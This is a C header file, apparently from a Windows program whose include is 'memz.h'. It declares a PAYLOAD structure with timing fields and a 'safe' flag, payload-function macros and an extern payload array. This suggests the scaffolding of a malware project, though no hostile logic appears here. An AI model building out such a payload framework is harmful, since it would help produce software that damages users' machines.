#pragma once
#include "memz.h"

typedef struct {
	int(*payloadFunction)(int, int, BOOLEAN);
	wchar_t *name;
	HWND btn;
	int delay, times, runtime, delaytime;
	BOOLEAN safe;
} PAYLOAD;

#define PAYLOADFUNC int times, int runtime, BOOLEAN skip
#define PAYLOADHEAD if (skip) goto out;

extern PAYLOAD payloads[];
extern const size_t nPayloads;